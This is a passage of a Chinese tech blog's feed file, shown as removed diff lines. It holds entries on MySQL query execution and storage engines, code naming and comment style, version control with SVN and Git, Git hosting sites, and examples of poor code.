-<p>优化器是在表里面有多个索引的时候，决定使用哪个索引；或者在一个语句有多表关联（join）的时候，决定各个表的连接顺序。比如你执行下面这样的语句，这个语句是执行两个表的join：</p>
-
-<blockquote>
-<p>mysql&gt; select * from t1 join t2 using(ID)  where t1.c=10 and t2.d=20;</p>
-</blockquote>
-
-<ul>
-<li>既可以先从表t1里面取出c=10的记录的ID值，再根据ID值关联到表t2，再判断t2里面d的值是否等于20。</li>
-<li>也可以先从表t2里面取出d=20的记录的ID值，再根据ID值关联到t1，再判断t1里面c的值是否等于10。</li>
-</ul>
-
-<p>这两种执行方法的逻辑结果是一样的，但是执行的效率会有不同，而优化器的作用就是决定选择使用哪一个方案。优化器阶段完成后，这个语句的执行方案就确定下来了。</p>
-
-<h3 id="toc_5">执行器</h3>
-
-<p>MySQL通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了执行器阶段，开始执行语句。</p>
-
-<p>开始执行的时候，要先判断一下你对这个表T有没有执行查询的权限，如果没有，就会返回没有权限的错误，如下所示。</p>
-
-<blockquote>
-<p>ERROR 1142 (42000): SELECT command denied to user &#39;b&#39;@&#39;localhost&#39; for table &#39;T&#39;</p>
-</blockquote>
-
-<p>如果有权限，就打开表继续执行。打开表的时候，执行器就会根据表的引擎定义，去使用这个引擎提供的接口。</p>
-
-<p>比如我们这个例子中的表T中，ID字段没有索引，那么执行器的执行流程是这样的：</p>
-
-<ol>
-<li><p>调用InnoDB引擎接口取这个表的第一行，判断ID值是不是10，如果不是则跳过，如果是则将这行存在结果集中；</p></li>
-<li><p>调用引擎接口取“下一行”，重复相同的判断逻辑，直到取到这个表的最后一行。</p></li>
-<li><p>执行器将上述遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。</p></li>
-</ol>
-
-<p>至此，这个语句就执行完成了。</p>
-
-<p>对于有索引的表，执行的逻辑也差不多。第一次调用的是“取满足条件的第一行”这个接口，之后循环取“满足条件的下一行”这个接口，这些接口都是引擎中已经定义好的。</p>
-
-<p>你会在数据库的慢查询日志中看到一个rows_examined的字段，表示这个语句执行过程中扫描了多少行。这个值就是在执行器每次调用引擎获取数据行的时候累加的。</p>
-
-<p>在有些场景下，执行器调用一次，在引擎内部则扫描了多行，因此引擎扫描行数跟rows_examined并不是完全相同的。</p>
-
-<h2 id="toc_6">存储引擎</h2>
-
-<p>而存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持</p>
-
-<ul>
-<li>InnoDB</li>
-<li>MyISAM</li>
-<li>Memory</li>
-</ul>
-
-<p>等多个存储引擎。可以通过<code>SHOW ENGINES;</code>查看，现在最常用的存储引擎是InnoDB，它从MySQL 5.5.5版本开始成为了默认存储引擎。在create table语句中使用<code>engine=memory</code>, 可以来指定使用内存引擎创建表。</p>
-
-<p><img src="media/16301414327814/16301424628810.jpg" alt="" style="width:860px;"/></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[改善代码质量规约]]></title>
-    <link href="http://565785929.github.io/16261043857914.html"/>
-    <updated>2021-07-12T23:39:45+08:00</updated>
-    <id>http://565785929.github.io/16261043857914.html</id>
-    <content type="html"><![CDATA[
-<p><a href="https://google.github.io/styleguide/">Google Style</a><br/>
-<img src="media/16261043857914/16322357012159.jpg" alt="" style="width:300px;"/></p>
-
-<h2 id="toc_0">命名与注释(Naming and Comments)</h2>
-
-<h3 id="toc_1">命名</h3>
-
-<h4 id="toc_2">一、命名长度</h4>
-
-<h4 id="toc_3">二、利用上下文来简化命名</h4>
-
-<pre class="line-numbers"><code class="language-text">public class User {
-  private String userName;
-  private String userPassword;
-  private String userAvatarUrl;
-  //...
-}
-</code></pre>
-
-<p>在User类这样一个上下文中，我们没有在成员变量的命名中重复添加 &quot;user&quot; 这样一个前缀单词，而是直接命名为name, password, avatarUrl。在使用这些属性的时候，我们能借助对象这样一个上下文，表意也足够明确。</p>
-
-<pre class="line-numbers"><code class="language-text">User user = new User();
-user.getName(); // 借助user对象这个上下文
-</code></pre>
-
-<p>除了类之外，函数参数也可以借助函数这个上下文来简化命名。</p>
-
-<pre class="line-numbers"><code class="language-text">public void uploadUserAvatarImageToAliyun(String userAvatarImageUri);
-// 利用上下文简化为：
-public void uploadUserAvatarImageToAliyun(String imageUri);
-</code></pre>
-
-<h4 id="toc_4">三、命名</h4>
-
-<h3 id="toc_5">注释</h3>
-
-<h4 id="toc_6">一、注释写什么</h4>
-
-<pre class="line-numbers"><code class="language-text">/**
-* (what) Bean factory to create beans. 
-* 
-* (why) The class likes Spring IOC framework, but is more lightweight. 
-*
-* (how) Create objects from different sources sequentially:
-* user specified object &gt; SPI &gt; configuration &gt; default object.
-*/
-public class BeansFactory {
-  // ...
-}
-</code></pre>
-
-<h4 id="toc_7">二、</h4>
-
-<h2 id="toc_8">代码风格(Code Style)</h2>
-
-<h2 id="toc_9">编程技巧(Coding Tips)</h2>
-
-<ul>
-<li></li>
-</ul>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[为什么需要版本控制]]></title>
-    <link href="http://565785929.github.io/16253298632146.html"/>
-    <updated>2021-07-04T00:31:03+08:00</updated>
-    <id>http://565785929.github.io/16253298632146.html</id>
-    <content type="html"><![CDATA[
-<h2 id="toc_0">概述</h2>
-
-<p>在软件开发过程，每天都会产生新的代码，代码合并的过程中可能会出现如下问题：</p>
-
-<ul>
-<li>  代码被覆盖或丢失</li>
-<li>  代码写的不理想希望还原之前的版本</li>
-<li>  希望知道与之前版本的差别</li>
-<li>  是谁修改了代码以及为什么修改</li>
-<li>  发版时希望分成不同的版本(测试版、发行版等)</li>
-</ul>
-
-<p>因此，我们希望有一种机制，能够帮助我们：</p>
-
-<ul>
-<li>  可以随时回滚到之前的版本</li>
-<li>  协同开发时不会覆盖别人的代码</li>
-<li>  留下修改记录，以便随时查看</li>
-<li>  发版时可以方便的管理不同的版本</li>
-</ul>
-
-<h2 id="toc_1">什么是版本控制系统</h2>
-
-<p>一个标准的版本控制系统 Version Control System (VCS)，通常需要有以下功能：</p>
-
-<ul>
-<li>  能够创建 Repository (仓库)，用来保存代码</li>
-<li>  协同开发时方便将代码分发给团队成员</li>
-<li>  记录每次修改代码的内容、时间、原因等信息</li>
-<li>  能够创建 Branch (分支)，可以根据不同的场景进行开发</li>
-<li>  能够创建 Tag (标签)，建立项目里程碑</li>
-</ul>
-
-<h2 id="toc_2">什么是Svn</h2>
-
-<p><img src="media/16253298632146/16253300167643.jpg" alt=""/></p>
-
-<p>Subversion(SVN) 是一个开源的版本控制系統, 也就是说 Subversion 管理着随时间改变的数据。 这些数据放置在一个中央资料档案库(repository) 中。 这个档案库很像一个普通的文件服务器, 不过它会记住每一次文件的变动。 这样你就可以把档案恢复到旧的版本, 或是浏览文件的变动历史。</p>
-
-<p>日常开发过程其实就是这样的（假设你已经Checkout并且已经工作了几天）：</p>
-
-<ol>
-<li>Update(获得最新的代码) --&gt;</li>
-<li>作出自己的修改并调试成功 --&gt; </li>
-<li>Commit(大家就可以看到你的修改了) </li>
-</ol>
-
-<p>如果两个程序员同时修改了同一个文件呢, SVN 可以合并这两个程序员的改动，实际上SVN管理源代码是以行为单位的，就是说两个程序员只要不是修改了同一行程序，SVN都会自动合并两种修改。如果是同一行，SVN 会提示文件 Conflict, 冲突，需要手动确认。</p>
-
-<h2 id="toc_3">什么是Git</h2>
-
-<p><img src="media/16253298632146/16253299182713.jpg" alt=""/></p>
-
-<ul>
-<li>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</li>
-<li>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</li>
-<li>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</li>
-</ul>
-
-<h2 id="toc_4">版本控制系统的发展史</h2>
-
-<p>版本控制系统发展至今有几种不同的模式：</p>
-
-<h3 id="toc_5">Local VCS</h3>
-
-<p>本地使用 <code>复制/粘贴</code> 的方式进行管理，缺点是无法协同开发</p>
-
-<h3 id="toc_6">Centralized VCS (Lock，悲观锁)</h3>
-
-<p>中央集中式版本控制系统团队共用仓库，当某人需要编辑文件时，进行锁定，以免其他人同时编辑时造成冲突。缺点是虽然避免了冲突，但不是很方便。其他人需要排队才能编辑文件，如果有人编辑了很久或是忘记解锁就会造成其他人长时间等待的情况。</p>
-
-<h3 id="toc_7">Centralized VCS (Merge，乐观锁)</h3>
-
-<p>中央集中式版本控制系统团队共用仓库，不采用悲观锁方式来避免冲突，而是事后发现如果别人也修改相同文件(冲突)，再进行手动修改解决。有很多 VCS 属于这种类型，如：CVS，Subversion，Perforce 等</p>
-
-<p>中央集中式版本控制系统的共同问题是，做任何操作都需要和服务器同步，如果服务器宕机则会造成无法继续工作的窘迫。</p>
-
-<h3 id="toc_8">Distributed VCS</h3>
-
-<p>分布式版本控制系统，本地也拥有完整的代码仓库，就不会出现上述集中式管理的问题，即使没有网络，依然可以 <code>commit</code> 和看 <code>log</code>，也无需担心服务器同步问题。如：Git，Mercurial，Bazaar 等就属于分布式版本控制系统。缺点是功能比较复杂，上手需要一定的学习时间。</p>
-
-<p>本教程来自<a href="https://www.funtl.com/zh/git/">千锋教育-李卫民</a></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[常见Git仓库]]></title>
-    <link href="http://565785929.github.io/16253295942611.html"/>
-    <updated>2021-07-04T00:26:34+08:00</updated>
-    <id>http://565785929.github.io/16253295942611.html</id>
-    <content type="html"><![CDATA[
-<h2 id="toc_0">GitHub</h2>
-
-<h2 id="toc_1">GitLab</h2>
-
-<p><img src="media/16253295942611/16253303567762.jpg" alt=""/></p>
-
-<p><a href="http://bdgit.eigpay.com/">http://bdgit.eigpay.com/</a></p>
-
-<p>git是一个版本管理软件，由linux之父花了三天搞出来的东西，他没有界面，只支持命令行。</p>
-
-<p>github是一个网站，因为git没有图形界面，github它支持在线的几乎所有git的操作，最重要它也是一个包含了很多程序员的开源社区。</p>
-
-<p>gitlib 是用于实现git功能的开发库</p>
-
-<p>gitlab提倡开源，如果你不想开源就要花钱，你如果不愿意花钱，就自己搞个服务器，装gitlab这个软件来实现自己的版本控制，有点私服的概念。</p>
-
-<p>作者：笑笑酱丶<br/>
-链接：<a href="https://www.jianshu.com/p/26fa7df41c9a">https://www.jianshu.com/p/26fa7df41c9a</a><br/>
-来源：简书<br/>
-著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[如何写出让同事无法维护的代码]]></title>
-    <link href="http://565785929.github.io/16232479391790.html"/>
-    <updated>2021-06-09T22:12:19+08:00</updated>
-    <id>http://565785929.github.io/16232479391790.html</id>
-    <content type="html"><![CDATA[
-<p>代码重复，无基本封装。<br/>
-<img src="media/16232479391790/16232481453830.jpg" alt="" style="width:1308px;"/></p>
-
-<p>魔法值而且和数据库备注不相符<br/>
-<img src="media/16232479391790/16232481975117.jpg" alt="" style="width:1234px;"/><br/>
-<img src="media/16232479391790/16232482083869.jpg" alt="" style="width:1202px;"/></p>
-
-<p>并非可复用代码，参数冗余 <br/>
-<img src="media/16232479391790/16232483060076.jpg" alt="" style="width:1184px;"/></p>
-
-<p>在构造方法里自启动 线程</p>
-
-<p><img src="media/16232479391790/16233537413969.jpg" alt="" style="width:1234px;"/></p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Ray Tracing for one week]]></title>
-    <link href="http://565785929.github.io/16197951416649.html"/>
-    <updated>2021-04-30T23:05:41+08:00</updated>
-    <id>http://565785929.github.io/16197951416649.html</id>
-    <content type="html"><![CDATA[
 
 ]]></content>
   </entry>
